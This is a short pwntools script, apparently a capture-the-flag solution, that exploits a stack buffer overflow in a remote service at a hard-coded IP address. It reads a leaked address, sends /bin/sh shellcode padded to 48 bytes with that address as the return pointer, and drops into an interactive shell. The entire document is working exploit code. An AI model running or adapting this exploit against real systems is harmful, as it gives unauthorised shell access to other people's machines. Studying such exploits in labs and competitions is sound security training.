from pwn import *
p = remote("3.238.30.178",3000)
p.recvuntil("at 0x")
ret = u64(p.recv(8).ljust(8, b"\x00"))
shell=asm(shellcraft.sh())
p.sendlineafter(": ",shell+b"A"*(48-len(shell))+p64(ret))
p.interactive()